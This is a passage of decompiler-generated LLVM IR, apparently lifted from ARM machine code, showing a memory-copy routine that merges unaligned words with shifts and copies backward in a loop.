  %v5_12684 = icmp slt i32 %v0_12688, 12
  switch i2 %v0_1259c.off0, label %dec_label_pc_125a8 [
    i2 -1, label %dec_label_pc_12680
    i2 -2, label %dec_label_pc_12614
  ]

dec_label_pc_125a8:                               ; preds = %dec_label_pc_12594
  br i1 %v5_12684, label %dec_label_pc_125f4, label %dec_label_pc_125b0

dec_label_pc_125b0:                               ; preds = %dec_label_pc_125a8
  store i32 %v2_12680, i32* %r2.global-to-local, align 4
  %v3_125b4 = load i32, i32* @r4, align 4
  store i32 %v3_125b4, i32* %stack_var_-16, align 4
  %v6_125b4 = load i32, i32* @r5, align 4
  store i32 %v6_125b4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_125b8

dec_label_pc_125b8:                               ; preds = %dec_label_pc_125b8.dec_label_pc_125b8_crit_edge, %dec_label_pc_125b0
  %v0_125dc = phi i32 [ %v12_125dc, %dec_label_pc_125b8.dec_label_pc_125b8_crit_edge ], [ %v0_125dc74, %dec_label_pc_125b0 ]
  %v0_125bc = phi i32 [ %v0_125bc.pre, %dec_label_pc_125b8.dec_label_pc_125b8_crit_edge ], [ %v4_12598, %dec_label_pc_125b0 ]
  %v0_125b8 = phi i32 [ %v0_125b8.pre, %dec_label_pc_125b8.dec_label_pc_125b8_crit_edge ], [ %v2_12598, %dec_label_pc_125b0 ]
  %v3_125b8 = udiv i32 %v0_125b8, 256
  store i32 %v3_125b8, i32* %r3.global-to-local, align 4
  %v1_125bc = inttoptr i32 %v0_125bc to i32*
  %v2_125bc = load i32, i32* %v1_125bc, align 4
  store i32 %v2_125bc, i32* %r4.global-to-local, align 4
  %v3_125bc = add i32 %v0_125bc, 4
  %v4_125bc = inttoptr i32 %v3_125bc to i32*
  %v5_125bc = load i32, i32* %v4_125bc, align 4
  store i32 %v5_125bc, i32* %r5.global-to-local, align 4
  %v6_125bc = add i32 %v0_125bc, 8
  %v7_125bc = inttoptr i32 %v6_125bc to i32*
  %v8_125bc = load i32, i32* %v7_125bc, align 4
  store i32 %v8_125bc, i32* %ip.global-to-local, align 4
  %v9_125bc = add i32 %v0_125bc, 12
  %v10_125bc = inttoptr i32 %v9_125bc to i32*
  %v11_125bc = load i32, i32* %v10_125bc, align 4
  store i32 %v11_125bc, i32* @lr, align 4
  %v12_125bc = add i32 %v0_125bc, 16
  store i32 %v12_125bc, i32* %r1.global-to-local, align 4
  %v4_125c0 = mul i32 %v2_125bc, 16777216
  %v5_125c0 = or i32 %v4_125c0, %v3_125b8
  store i32 %v5_125c0, i32* %r3.global-to-local, align 4
  %v3_125c4 = udiv i32 %v2_125bc, 256
  %v4_125c8 = mul i32 %v5_125bc, 16777216
  %v5_125c8 = or i32 %v4_125c8, %v3_125c4
  store i32 %v5_125c8, i32* %r4.global-to-local, align 4
  %v3_125cc = udiv i32 %v5_125bc, 256
  %v4_125d0 = mul i32 %v8_125bc, 16777216
  %v5_125d0 = or i32 %v4_125d0, %v3_125cc
  store i32 %v5_125d0, i32* %r5.global-to-local, align 4
  %v3_125d4 = udiv i32 %v8_125bc, 256
  %v4_125d8 = mul i32 %v11_125bc, 16777216
  %v5_125d8 = or i32 %v4_125d8, %v3_125d4
  store i32 %v5_125d8, i32* @ip, align 4
  %v1_125dc = inttoptr i32 %v0_125dc to i32*
  store i32 %v5_125c0, i32* %v1_125dc, align 4
  %v3_125dc = add i32 %v0_125dc, 4
  %v4_125dc = inttoptr i32 %v3_125dc to i32*
  %v5_125dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_125dc, i32* %v4_125dc, align 4
  %v6_125dc = add i32 %v0_125dc, 8
  %v7_125dc = inttoptr i32 %v6_125dc to i32*
  %v8_125dc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_125dc, i32* %v7_125dc, align 4
  %v9_125dc = add i32 %v0_125dc, 12
  %v10_125dc = inttoptr i32 %v9_125dc to i32*
  %v11_125dc = load i32, i32* @ip, align 4
  store i32 %v11_125dc, i32* %v10_125dc, align 4
  %v12_125dc = add i32 %v0_125dc, 16
  store i32 %v12_125dc, i32* %r0.global-to-local, align 4
  %v0_125e0 = load i32, i32* %r2.global-to-local, align 4
  %v2_125e0 = add i32 %v0_125e0, -16
  store i32 %v2_125e0, i32* %r2.global-to-local, align 4
  %v6_125e4 = icmp slt i32 %v0_125e0, 16
  br i1 %v6_125e4, label %dec_label_pc_125e8, label %dec_label_pc_125b8.dec_label_pc_125b8_crit_edge

dec_label_pc_125b8.dec_label_pc_125b8_crit_edge:  ; preds = %dec_label_pc_125b8
  %v0_125b8.pre = load i32, i32* @lr, align 4
  %v0_125bc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_125b8

dec_label_pc_125e8:                               ; preds = %dec_label_pc_125b8
  %v2_125e8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_125e8, i32* @r4, align 4
  %v5_125e8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_125e8, i32* @r5, align 4
  %v2_125ec = add i32 %v0_125e0, -4
  store i32 %v2_125ec, i32* %r2.global-to-local, align 4
  %v4_125ec = add i32 %v0_125e0, 2147483632
  %v5_125ec = and i32 %v2_125ec, %v4_125ec
  %v6_125ec = icmp slt i32 %v5_125ec, 0
  store i1 %v6_125ec, i1* %cpsr_v.global-to-local, align 1
  %v7_125ec = icmp slt i32 %v2_125ec, 0
  store i1 %v7_125ec, i1* %cpsr_n.global-to-local, align 1
  %v5_125f0 = icmp slt i32 %v2_125e0, -12
  br i1 %v5_125f0, label %dec_label_pc_1260c, label %dec_label_pc_125f4

dec_label_pc_125f4:                               ; preds = %dec_label_pc_125e8, %dec_label_pc_125a8, %dec_label_pc_125f4
  %v1_12600 = phi i32 [ %v4_12600, %dec_label_pc_125f4 ], [ %v12_125dc, %dec_label_pc_125e8 ], [ %v0_125dc74, %dec_label_pc_125a8 ]
  %v0_125f4 = load i32, i32* @lr, align 4
  %v3_125f4 = udiv i32 %v0_125f4, 256
  store i32 %v3_125f4, i32* %ip.global-to-local, align 4
  %v0_125f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_125f8 = inttoptr i32 %v0_125f8 to i32*
  %v2_125f8 = load i32, i32* %v1_125f8, align 4
  store i32 %v2_125f8, i32* @lr, align 4
  %v4_125f8 = add i32 %v0_125f8, 4
  store i32 %v4_125f8, i32* %r1.global-to-local, align 4
  %v4_125fc = mul i32 %v2_125f8, 16777216
  %v5_125fc = or i32 %v4_125fc, %v3_125f4
  store i32 %v5_125fc, i32* @ip, align 4
  %v2_12600 = inttoptr i32 %v1_12600 to i32*
  store i32 %v5_125fc, i32* %v2_12600, align 4
  %v3_12600 = load i32, i32* %r0.global-to-local, align 4
  %v4_12600 = add i32 %v3_12600, 4
  store i32 %v4_12600, i32* %r0.global-to-local, align 4
  %v0_12604 = load i32, i32* %r2.global-to-local, align 4
  %v2_12604 = add i32 %v0_12604, -4
  store i32 %v2_12604, i32* %r2.global-to-local, align 4
  %v6_12608 = icmp slt i32 %v0_12604, 4
  br i1 %v6_12608, label %dec_label_pc_1260c.loopexit, label %dec_label_pc_125f4

dec_label_pc_1260c.loopexit:                      ; preds = %dec_label_pc_125f4
  %v4_12604 = sub i32 3, %v0_12604
  %v5_12604 = and i32 %v4_12604, %v0_12604
  %v6_12604 = icmp slt i32 %v5_12604, 0
  %v7_12604 = icmp slt i32 %v2_12604, 0
  store i1 %v6_12604, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_12604, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_1260c

dec_label_pc_1260c:                               ; preds = %dec_label_pc_1260c.loopexit, %dec_label_pc_125e8
  %v2_1254c112 = phi i32 [ %v4_12600, %dec_label_pc_1260c.loopexit ], [ %v12_125dc, %dec_label_pc_125e8 ]
  %v0_1253c108 = phi i32 [ %v2_12604, %dec_label_pc_1260c.loopexit ], [ %v2_125ec, %dec_label_pc_125e8 ]
  %v0_1260c = load i32, i32* %r1.global-to-local, align 4
  %v1_1260c = add i32 %v0_1260c, -3
  store i32 %v1_1260c, i32* @r1, align 4
  br label %bb132

dec_label_pc_12614:                               ; preds = %dec_label_pc_12594
  br i1 %v5_12684, label %dec_label_pc_12660, label %dec_label_pc_1261c

dec_label_pc_1261c:                               ; preds = %dec_label_pc_12614
  store i32 %v2_12680, i32* %r2.global-to-local, align 4
  %v3_12620 = load i32, i32* @r4, align 4
  store i32 %v3_12620, i32* %stack_var_-16, align 4
  %v6_12620 = load i32, i32* @r5, align 4
  store i32 %v6_12620, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12624

dec_label_pc_12624:                               ; preds = %dec_label_pc_12624.dec_label_pc_12624_crit_edge, %dec_label_pc_1261c
  %v0_12648 = phi i32 [ %v12_12648, %dec_label_pc_12624.dec_label_pc_12624_crit_edge ], [ %v0_125dc74, %dec_label_pc_1261c ]
  %v0_12628 = phi i32 [ %v0_12628.pre, %dec_label_pc_12624.dec_label_pc_12624_crit_edge ], [ %v4_12598, %dec_label_pc_1261c ]
  %v0_12624 = phi i32 [ %v0_12624.pre, %dec_label_pc_12624.dec_label_pc_12624_crit_edge ], [ %v2_12598, %dec_label_pc_1261c ]
  %v3_12624 = udiv i32 %v0_12624, 65536
  store i32 %v3_12624, i32* %r3.global-to-local, align 4
  %v1_12628 = inttoptr i32 %v0_12628 to i32*
  %v2_12628 = load i32, i32* %v1_12628, align 4
  store i32 %v2_12628, i32* %r4.global-to-local, align 4
  %v3_12628 = add i32 %v0_12628, 4
  %v4_12628 = inttoptr i32 %v3_12628 to i32*
  %v5_12628 = load i32, i32* %v4_12628, align 4
  store i32 %v5_12628, i32* %r5.global-to-local, align 4
  %v6_12628 = add i32 %v0_12628, 8
  %v7_12628 = inttoptr i32 %v6_12628 to i32*
  %v8_12628 = load i32, i32* %v7_12628, align 4
  store i32 %v8_12628, i32* %ip.global-to-local, align 4
  %v9_12628 = add i32 %v0_12628, 12
  %v10_12628 = inttoptr i32 %v9_12628 to i32*
  %v11_12628 = load i32, i32* %v10_12628, align 4
  store i32 %v11_12628, i32* @lr, align 4
  %v12_12628 = add i32 %v0_12628, 16
  store i32 %v12_12628, i32* %r1.global-to-local, align 4
  %v4_1262c = mul i32 %v2_12628, 65536
  %v5_1262c = or i32 %v4_1262c, %v3_12624
  store i32 %v5_1262c, i32* %r3.global-to-local, align 4
  %v3_12630 = udiv i32 %v2_12628, 65536
  %v4_12634 = mul i32 %v5_12628, 65536
  %v5_12634 = or i32 %v4_12634, %v3_12630
  store i32 %v5_12634, i32* %r4.global-to-local, align 4
  %v3_12638 = udiv i32 %v5_12628, 65536
  %v4_1263c = mul i32 %v8_12628, 65536
  %v5_1263c = or i32 %v4_1263c, %v3_12638
  store i32 %v5_1263c, i32* %r5.global-to-local, align 4
  %v3_12640 = udiv i32 %v8_12628, 65536
  %v4_12644 = mul i32 %v11_12628, 65536
  %v5_12644 = or i32 %v4_12644, %v3_12640
  store i32 %v5_12644, i32* @ip, align 4
  %v1_12648 = inttoptr i32 %v0_12648 to i32*
  store i32 %v5_1262c, i32* %v1_12648, align 4
  %v3_12648 = add i32 %v0_12648, 4
  %v4_12648 = inttoptr i32 %v3_12648 to i32*
  %v5_12648 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_12648, i32* %v4_12648, align 4
  %v6_12648 = add i32 %v0_12648, 8
  %v7_12648 = inttoptr i32 %v6_12648 to i32*
  %v8_12648 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_12648, i32* %v7_12648, align 4
  %v9_12648 = add i32 %v0_12648, 12
  %v10_12648 = inttoptr i32 %v9_12648 to i32*
  %v11_12648 = load i32, i32* @ip, align 4
  store i32 %v11_12648, i32* %v10_12648, align 4
  %v12_12648 = add i32 %v0_12648, 16
  store i32 %v12_12648, i32* %r0.global-to-local, align 4
  %v0_1264c = load i32, i32* %r2.global-to-local, align 4
  %v2_1264c = add i32 %v0_1264c, -16
  store i32 %v2_1264c, i32* %r2.global-to-local, align 4
  %v6_12650 = icmp slt i32 %v0_1264c, 16
  br i1 %v6_12650, label %dec_label_pc_12654, label %dec_label_pc_12624.dec_label_pc_12624_crit_edge

dec_label_pc_12624.dec_label_pc_12624_crit_edge:  ; preds = %dec_label_pc_12624
  %v0_12624.pre = load i32, i32* @lr, align 4
  %v0_12628.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12624

dec_label_pc_12654:                               ; preds = %dec_label_pc_12624
  %v2_12654 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12654, i32* @r4, align 4
  %v5_12654 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_12654, i32* @r5, align 4
  %v2_12658 = add i32 %v0_1264c, -4
  store i32 %v2_12658, i32* %r2.global-to-local, align 4
  %v4_12658 = add i32 %v0_1264c, 2147483632
  %v5_12658 = and i32 %v2_12658, %v4_12658
  %v6_12658 = icmp slt i32 %v5_12658, 0
  store i1 %v6_12658, i1* %cpsr_v.global-to-local, align 1
  %v7_12658 = icmp slt i32 %v2_12658, 0
  store i1 %v7_12658, i1* %cpsr_n.global-to-local, align 1
  %v5_1265c = icmp slt i32 %v2_1264c, -12
  br i1 %v5_1265c, label %dec_label_pc_12678, label %dec_label_pc_12660

dec_label_pc_12660:                               ; preds = %dec_label_pc_12654, %dec_label_pc_12614, %dec_label_pc_12660
  %v1_1266c = phi i32 [ %v4_1266c, %dec_label_pc_12660 ], [ %v12_12648, %dec_label_pc_12654 ], [ %v0_125dc74, %dec_label_pc_12614 ]
  %v0_12660 = load i32, i32* @lr, align 4
  %v3_12660 = udiv i32 %v0_12660, 65536
  store i32 %v3_12660, i32* %ip.global-to-local, align 4
  %v0_12664 = load i32, i32* %r1.global-to-local, align 4
  %v1_12664 = inttoptr i32 %v0_12664 to i32*
  %v2_12664 = load i32, i32* %v1_12664, align 4
  store i32 %v2_12664, i32* @lr, align 4
  %v4_12664 = add i32 %v0_12664, 4
  store i32 %v4_12664, i32* %r1.global-to-local, align 4
  %v4_12668 = mul i32 %v2_12664, 65536
  %v5_12668 = or i32 %v4_12668, %v3_12660
  store i32 %v5_12668, i32* @ip, align 4
  %v2_1266c = inttoptr i32 %v1_1266c to i32*
  store i32 %v5_12668, i32* %v2_1266c, align 4
  %v3_1266c = load i32, i32* %r0.global-to-local, align 4
  %v4_1266c = add i32 %v3_1266c, 4
  store i32 %v4_1266c, i32* %r0.global-to-local, align 4
  %v0_12670 = load i32, i32* %r2.global-to-local, align 4
  %v2_12670 = add i32 %v0_12670, -4
  store i32 %v2_12670, i32* %r2.global-to-local, align 4
  %v6_12674 = icmp slt i32 %v0_12670, 4
  br i1 %v6_12674, label %dec_label_pc_12678.loopexit, label %dec_label_pc_12660

dec_label_pc_12678.loopexit:                      ; preds = %dec_label_pc_12660
  %v4_12670 = sub i32 3, %v0_12670
  %v5_12670 = and i32 %v4_12670, %v0_12670
  %v6_12670 = icmp slt i32 %v5_12670, 0
  %v7_12670 = icmp slt i32 %v2_12670, 0
  store i1 %v6_12670, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_12670, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_12678

dec_label_pc_12678:                               ; preds = %dec_label_pc_12678.loopexit, %dec_label_pc_12654
  %v2_1254c113 = phi i32 [ %v4_1266c, %dec_label_pc_12678.loopexit ], [ %v12_12648, %dec_label_pc_12654 ]
  %v0_1253c109 = phi i32 [ %v2_12670, %dec_label_pc_12678.loopexit ], [ %v2_12658, %dec_label_pc_12654 ]
  %v0_12678 = load i32, i32* %r1.global-to-local, align 4
  %v1_12678 = add i32 %v0_12678, -2
  store i32 %v1_12678, i32* @r1, align 4
  br label %bb132

dec_label_pc_12680:                               ; preds = %dec_label_pc_12594
  br i1 %v5_12684, label %dec_label_pc_126cc, label %dec_label_pc_12688

dec_label_pc_12688:                               ; preds = %dec_label_pc_12680
  store i32 %v2_12680, i32* %r2.global-to-local, align 4
  %v3_1268c = load i32, i32* @r4, align 4
  store i32 %v3_1268c, i32* %stack_var_-16, align 4
  %v6_1268c = load i32, i32* @r5, align 4
  store i32 %v6_1268c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12690

dec_label_pc_12690:                               ; preds = %dec_label_pc_12690.dec_label_pc_12690_crit_edge, %dec_label_pc_12688
  %v0_126b4 = phi i32 [ %v12_126b4, %dec_label_pc_12690.dec_label_pc_12690_crit_edge ], [ %v0_125dc74, %dec_label_pc_12688 ]
  %v0_12694 = phi i32 [ %v0_12694.pre, %dec_label_pc_12690.dec_label_pc_12690_crit_edge ], [ %v4_12598, %dec_label_pc_12688 ]
  %v0_12690 = phi i32 [ %v0_12690.pre, %dec_label_pc_12690.dec_label_pc_12690_crit_edge ], [ %v2_12598, %dec_label_pc_12688 ]
  %v3_12690 = udiv i32 %v0_12690, 16777216
  store i32 %v3_12690, i32* %r3.global-to-local, align 4
  %v1_12694 = inttoptr i32 %v0_12694 to i32*
  %v2_12694 = load i32, i32* %v1_12694, align 4
  store i32 %v2_12694, i32* %r4.global-to-local, align 4
  %v3_12694 = add i32 %v0_12694, 4
  %v4_12694 = inttoptr i32 %v3_12694 to i32*
  %v5_12694 = load i32, i32* %v4_12694, align 4
  store i32 %v5_12694, i32* %r5.global-to-local, align 4
  %v6_12694 = add i32 %v0_12694, 8
  %v7_12694 = inttoptr i32 %v6_12694 to i32*
  %v8_12694 = load i32, i32* %v7_12694, align 4
  store i32 %v8_12694, i32* %ip.global-to-local, align 4
  %v9_12694 = add i32 %v0_12694, 12
  %v10_12694 = inttoptr i32 %v9_12694 to i32*
  %v11_12694 = load i32, i32* %v10_12694, align 4
  store i32 %v11_12694, i32* @lr, align 4
  %v12_12694 = add i32 %v0_12694, 16
  store i32 %v12_12694, i32* %r1.global-to-local, align 4
  %v4_12698 = mul i32 %v2_12694, 256
  %v5_12698 = or i32 %v4_12698, %v3_12690
  store i32 %v5_12698, i32* %r3.global-to-local, align 4
  %v3_1269c = udiv i32 %v2_12694, 16777216
  %v4_126a0 = mul i32 %v5_12694, 256
  %v5_126a0 = or i32 %v4_126a0, %v3_1269c
  store i32 %v5_126a0, i32* %r4.global-to-local, align 4
  %v3_126a4 = udiv i32 %v5_12694, 16777216
  %v4_126a8 = mul i32 %v8_12694, 256
  %v5_126a8 = or i32 %v4_126a8, %v3_126a4
  store i32 %v5_126a8, i32* %r5.global-to-local, align 4
  %v3_126ac = udiv i32 %v8_12694, 16777216
  %v4_126b0 = mul i32 %v11_12694, 256
  %v5_126b0 = or i32 %v4_126b0, %v3_126ac
  store i32 %v5_126b0, i32* @ip, align 4
  %v1_126b4 = inttoptr i32 %v0_126b4 to i32*
  store i32 %v5_12698, i32* %v1_126b4, align 4
  %v3_126b4 = add i32 %v0_126b4, 4
  %v4_126b4 = inttoptr i32 %v3_126b4 to i32*
  %v5_126b4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_126b4, i32* %v4_126b4, align 4
  %v6_126b4 = add i32 %v0_126b4, 8
  %v7_126b4 = inttoptr i32 %v6_126b4 to i32*
  %v8_126b4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_126b4, i32* %v7_126b4, align 4
  %v9_126b4 = add i32 %v0_126b4, 12
  %v10_126b4 = inttoptr i32 %v9_126b4 to i32*
  %v11_126b4 = load i32, i32* @ip, align 4
  store i32 %v11_126b4, i32* %v10_126b4, align 4
  %v12_126b4 = add i32 %v0_126b4, 16
  store i32 %v12_126b4, i32* %r0.global-to-local, align 4
  %v0_126b8 = load i32, i32* %r2.global-to-local, align 4
  %v2_126b8 = add i32 %v0_126b8, -16
  store i32 %v2_126b8, i32* %r2.global-to-local, align 4
  %v6_126bc = icmp slt i32 %v0_126b8, 16
  br i1 %v6_126bc, label %dec_label_pc_126c0, label %dec_label_pc_12690.dec_label_pc_12690_crit_edge

dec_label_pc_12690.dec_label_pc_12690_crit_edge:  ; preds = %dec_label_pc_12690
  %v0_12690.pre = load i32, i32* @lr, align 4
  %v0_12694.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12690

dec_label_pc_126c0:                               ; preds = %dec_label_pc_12690
  %v2_126c0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_126c0, i32* @r4, align 4
  %v5_126c0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_126c0, i32* @r5, align 4
  %v2_126c4 = add i32 %v0_126b8, -4
  store i32 %v2_126c4, i32* %r2.global-to-local, align 4
  %v4_126c4 = add i32 %v0_126b8, 2147483632
  %v5_126c4 = and i32 %v2_126c4, %v4_126c4
  %v6_126c4 = icmp slt i32 %v5_126c4, 0
  store i1 %v6_126c4, i1* %cpsr_v.global-to-local, align 1
  %v7_126c4 = icmp slt i32 %v2_126c4, 0
  store i1 %v7_126c4, i1* %cpsr_n.global-to-local, align 1
  %v5_126c8 = icmp slt i32 %v2_126b8, -12
  br i1 %v5_126c8, label %dec_label_pc_126e4, label %dec_label_pc_126cc

dec_label_pc_126cc:                               ; preds = %dec_label_pc_12680, %dec_label_pc_126c0, %dec_label_pc_126cc
  %v1_126d8 = phi i32 [ %v4_126d8, %dec_label_pc_126cc ], [ %v0_125dc74, %dec_label_pc_12680 ], [ %v12_126b4, %dec_label_pc_126c0 ]
  %v0_126cc = load i32, i32* @lr, align 4
  %v3_126cc = udiv i32 %v0_126cc, 16777216
  store i32 %v3_126cc, i32* %ip.global-to-local, align 4
  %v0_126d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_126d0 = inttoptr i32 %v0_126d0 to i32*
  %v2_126d0 = load i32, i32* %v1_126d0, align 4
  store i32 %v2_126d0, i32* @lr, align 4
  %v4_126d0 = add i32 %v0_126d0, 4
  store i32 %v4_126d0, i32* %r1.global-to-local, align 4
  %v4_126d4 = mul i32 %v2_126d0, 256
  %v5_126d4 = or i32 %v4_126d4, %v3_126cc
  store i32 %v5_126d4, i32* @ip, align 4
  %v2_126d8 = inttoptr i32 %v1_126d8 to i32*
  store i32 %v5_126d4, i32* %v2_126d8, align 4
  %v3_126d8 = load i32, i32* %r0.global-to-local, align 4
  %v4_126d8 = add i32 %v3_126d8, 4
  store i32 %v4_126d8, i32* %r0.global-to-local, align 4
  %v0_126dc = load i32, i32* %r2.global-to-local, align 4
  %v2_126dc = add i32 %v0_126dc, -4
  store i32 %v2_126dc, i32* %r2.global-to-local, align 4
  %v6_126e0 = icmp slt i32 %v0_126dc, 4
  br i1 %v6_126e0, label %dec_label_pc_126e4.loopexit, label %dec_label_pc_126cc

dec_label_pc_126e4.loopexit:                      ; preds = %dec_label_pc_126cc
  %v4_126dc = sub i32 3, %v0_126dc
  %v5_126dc = and i32 %v4_126dc, %v0_126dc
  %v6_126dc = icmp slt i32 %v5_126dc, 0
  %v7_126dc = icmp slt i32 %v2_126dc, 0
  store i1 %v6_126dc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_126dc, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_126e4

dec_label_pc_126e4:                               ; preds = %dec_label_pc_126e4.loopexit, %dec_label_pc_126c0
  %v2_1254c111 = phi i32 [ %v4_126d8, %dec_label_pc_126e4.loopexit ], [ %v12_126b4, %dec_label_pc_126c0 ]
  %v0_1253c107 = phi i32 [ %v2_126dc, %dec_label_pc_126e4.loopexit ], [ %v2_126c4, %dec_label_pc_126c0 ]
  %v0_126e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_126e4 = add i32 %v0_126e4, -1
  store i32 %v1_126e4, i32* @r1, align 4
  br label %bb132

dec_label_pc_126ec:                               ; preds = %dec_label_pc_124a0
  %v1_126ec = load i32, i32* @r2, align 4
  %v2_126ec = add i32 %v1_126ec, %v0_124a0
  store i32 %v2_126ec, i32* @r1, align 4
  %v2_126f0 = add i32 %v1_126ec, %v1_124a0
  store i32 %v2_126f0, i32* %r0.global-to-local, align 4
  %v2_126f4 = add i32 %v1_126ec, -4
  store i32 %v2_126f4, i32* %r2.global-to-local, align 4
  %v4_126f4 = sub i32 3, %v1_126ec
  %v5_126f4 = and i32 %v4_126f4, %v1_126ec
  %v6_126f4 = icmp slt i32 %v5_126f4, 0
  store i1 %v6_126f4, i1* %cpsr_v.global-to-local, align 1
  %v7_126f4 = icmp slt i32 %v2_126f4, 0
  store i1 %v7_126f4, i1* %cpsr_n.global-to-local, align 1
  %v5_126f8 = icmp slt i32 %v1_126ec, 4
  br i1 %v5_126f8, label %bb142, label %dec_label_pc_126fc

dec_label_pc_126fc:                               ; preds = %dec_label_pc_126ec
  %v1_126fc = urem i32 %v2_126f0, 4
  store i32 %v1_126fc, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_126fc = icmp eq i32 %v1_126fc, 0
  br i1 %v2_126fc, label %dec_label_pc_12704, label %dec_label_pc_127a4

dec_label_pc_12704:                               ; preds = %dec_label_pc_126fc
  %v1_12704 = urem i32 %v2_126ec, 4
  store i32 %v1_12704, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_12704 = icmp eq i32 %v1_12704, 0
  br i1 %v2_12704, label %dec_label_pc_1270c, label %dec_label_pc_127d0

dec_label_pc_1270c:                               ; preds = %dec_label_pc_12704, %dec_label_pc_127c8
  %v0_1272448 = phi i32 [ %v2_126f0, %dec_label_pc_12704 ], [ %v0_1281831, %dec_label_pc_127c8 ]
  %v0_1272047 = phi i32 [ %v2_126ec, %dec_label_pc_12704 ], [ %v0_127c8, %dec_label_pc_127c8 ]
  %v0_1270c = phi i32 [ %v2_126f4, %dec_label_pc_12704 ], [ %v2_127c0, %dec_label_pc_127c8 ]
  %v2_1270c = add i32 %v0_1270c, -8
  store i32 %v2_1270c, i32* %r2.global-to-local, align 4
  %v4_1270c = sub i32 7, %v0_1270c
  %v5_1270c = and i32 %v4_1270c, %v0_1270c
  %v6_1270c = icmp slt i32 %v5_1270c, 0
  store i1 %v6_1270c, i1* %cpsr_v.global-to-local, align 1
  %v7_1270c = icmp slt i32 %v2_1270c, 0
  store i1 %v7_1270c, i1* %cpsr_n.global-to-local, align 1
  %v5_12710 = icmp slt i32 %v0_1270c, 8
  br i1 %v5_12710, label %dec_label_pc_1275c, label %dec_label_pc_12714

dec_label_pc_12714:                               ; preds = %dec_label_pc_1270c
  %v3_12714 = load i32, i32* @r4, align 4
  %v5_12714 = inttoptr i32 %v3_12714 to i8*
  store i8* %v5_12714, i8** %stack_var_-8, align 4
  %v8_12714 = load i32, i32* @lr, align 4
  %v2_12718 = add i32 %v0_1270c, -28
  store i32 %v2_12718, i32* %r2.global-to-local, align 4
  %v4_12718 = sub i32 27, %v0_1270c
  %v5_12718 = and i32 %v4_12718, %v2_1270c
  %v6_12718 = icmp slt i32 %v5_12718, 0
  store i1 %v6_12718, i1* %cpsr_v.global-to-local, align 1
  %v7_12718 = icmp slt i32 %v2_12718, 0
  store i1 %v7_12718, i1* %cpsr_n.global-to-local, align 1
  %v5_1271c = icmp slt i32 %v2_1270c, 20
  br i1 %v5_1271c, label %dec_label_pc_12738, label %dec_label_pc_12720

dec_label_pc_12720:                               ; preds = %dec_label_pc_12714, %dec_label_pc_12720.dec_label_pc_12720_crit_edge
  %v0_12724 = phi i32 [ %v1_1272c, %dec_label_pc_12720.dec_label_pc_12720_crit_edge ], [ %v0_1272448, %dec_label_pc_12714 ]
  %v0_12720 = phi i32 [ %v0_12720.pre, %dec_label_pc_12720.dec_label_pc_12720_crit_edge ], [ %v0_1272047, %dec_label_pc_12714 ]
  %v1_12720 = add i32 %v0_12720, -4
  %v2_12720 = inttoptr i32 %v1_12720 to i32*
  %v3_12720 = load i32, i32* %v2_12720, align 4
  store i32 %v3_12720, i32* %r3.global-to-local, align 4
  %v4_12720 = add i32 %v0_12720, -8
  %v5_12720 = inttoptr i32 %v4_12720 to i32*
  %v6_12720 = load i32, i32* %v5_12720, align 4
  store i32 %v6_12720, i32* %r4.global-to-local, align 4
  %v7_12720 = add i32 %v0_12720, -12
  %v8_12720 = inttoptr i32 %v7_12720 to i32*
  %v9_12720 = load i32, i32* %v8_12720, align 4
  store i32 %v9_12720, i32* %ip.global-to-local, align 4
  %v10_12720 = add i32 %v0_12720, -16
  %v11_12720 = inttoptr i32 %v10_12720 to i32*
  %v12_12720 = load i32, i32* %v11_12720, align 4
  store i32 %v12_12720, i32* %lr.global-to-local, align 4
  store i32 %v10_12720, i32* %r1.global-to-local, align 4
  %v1_12724 = add i32 %v0_12724, -16
  %v2_12724 = inttoptr i32 %v1_12724 to i32*
  store i32 %v3_12720, i32* %v2_12724, align 4
  %v4_12724 = add i32 %v0_12724, -12
  %v5_12724 = inttoptr i32 %v4_12724 to i32*
  %v6_12724 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_12724, i32* %v5_12724, align 4
  %v7_12724 = add i32 %v0_12724, -8
  %v8_12724 = inttoptr i32 %v7_12724 to i32*
  %v9_12724 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_12724, i32* %v8_12724, align 4
  %v10_12724 = add i32 %v0_12724, -4
  %v11_12724 = inttoptr i32 %v10_12724 to i32*
  %v12_12724 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_12724, i32* %v11_12724, align 4
  store i32 %v1_12724, i32* %r0.global-to-local, align 4
  %v0_12728 = load i32, i32* %r1.global-to-local, align 4
  %v1_12728 = add i32 %v0_12728, -4
  %v2_12728 = inttoptr i32 %v1_12728 to i32*
  %v3_12728 = load i32, i32* %v2_12728, align 4
  store i32 %v3_12728, i32* %r3.global-to-local, align 4
  %v4_12728 = add i32 %v0_12728, -8
  %v5_12728 = inttoptr i32 %v4_12728 to i32*
  %v6_12728 = load i32, i32* %v5_12728, align 4
